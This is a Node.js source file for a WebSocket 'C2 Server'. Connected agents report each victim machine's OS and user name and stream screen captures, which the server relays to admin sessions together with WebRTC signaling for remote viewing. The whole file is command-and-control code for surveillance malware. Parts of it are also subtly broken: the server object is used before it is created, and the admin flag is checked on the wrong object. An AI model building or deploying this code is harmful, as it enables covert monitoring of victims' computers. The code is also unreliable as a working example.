const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

// --- GLOBAL STATE ---
let app;
let server;
let wss;
let clients = {}; // { id: { ws, info, isAdmin, lastSeen } }

function initServer() {
    if (app) return { app, server, wss };

    app = express();
    server = http.createServer(app);
    wss = new WebSocket.Server({ server });

    // Serve static files (admin.html) from the current directory
    app.use(express.static(path.join(__dirname))); 

    // Health check endpoint
    app.get('/health', (req, res) => {
        res.status(200).send('OK');
    });

    wss.on('connection', (ws, req) => {
        const id = uuidv4().substr(0, 8);
        clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

        console.log(`[+] Client Connected: ${id}`);

        // Send registration confirmation back to the client
        ws.send(JSON.stringify({ type: 'registered', id: id }));

        ws.on('message', (msg) => {
            try {
                const data = JSON.parse(msg);

                // Check if this is an Admin connecting
                if (data.type === 'register_admin') {
                    clients[id].isAdmin = true;
                    console.log(`[ADMIN] Connected with ID: ${id}`);
                    broadcastToAdmin(id, { type: 'system', message: `Admin logged in` });
                    return;
                }

                // If it's an agent reporting in
                if (data.type === 'info') {
                    clients[id].info = data;
                    clients[id].lastSeen = Date.now();
                    
                    // Log it locally
                    console.log(`[ADMIN ALERT] 🟢 New User: ${data.os} (${data.user})`);
                    
                    // Broadcast to ALL admins so they see it in their grid/logs
                    notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
                    
                    // ALSO broadcast the full info object so the grid updates immediately
                    broadcastToAdmin(id, data); 
                } 
                // Forward signaling data (Offer/Answer/Candidate) between users
                else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                    forwardToTarget(id, data);
                } 
                // General data broadcast (e.g., screen_data, ping, alert)
                else {
                    if (data.type === 'screen_data') {
                        console.log(`[DATA] Screen capture from ${id}`);
                    }
                    broadcastToAdmin(id, data);
                }
            } catch (e) {
                console.error("Message parsing error:", e);
            }
        });

        ws.on('close', () => {
            delete clients[id];
            notifyAdmin(id, '🔴 User Disconnected');
        });
    });

    return { app, server, wss };
}

function notifyAdmin(id, msg) {
    console.log(`[ADMIN ALERT] ${msg}`);
    // Broadcast to all admins
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
        }
    });
}

function broadcastToAdmin(id, data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, ...data }));
        }
    });
}

function forwardToTarget(sourceId, data) {
    // If the data contains a specific target ID, send it there
    if (data.targetId && clients[data.targetId]) {
        const targetWs = clients[data.targetId].ws;
        if (targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify(data));
        }
    }
}

const PORT = process.env.PORT || 3000;

// Local Development Listener
if (!module.parent) {
    server.listen(PORT, () => {
        console.log(`C2 Server running on port ${PORT}`);
    });
}

// Vercel Export
exports.handler = async (event, context) => {
    const { app, server, wss } = initServer();
    
    // Handle HTTP requests
    return new Promise((resolve) => {
        // Create a mock response object for Vercel
        const req = event;
        const res = {
            statusCode: 200,
            headers: {},
            body: '',
            end: (body) => {
                resolve({
                    statusCode: 200,
                    headers: { 'Content-Type': 'text/html' },
                    body: body
                });
            },
            writeHead: (code, headers) => {
                res.statusCode = code;
                res.headers = headers;
            },
            write: (chunk) => {
                res.body += chunk;
            }
        };

        // Use Express to handle the request
        app(req, res);
    });
};
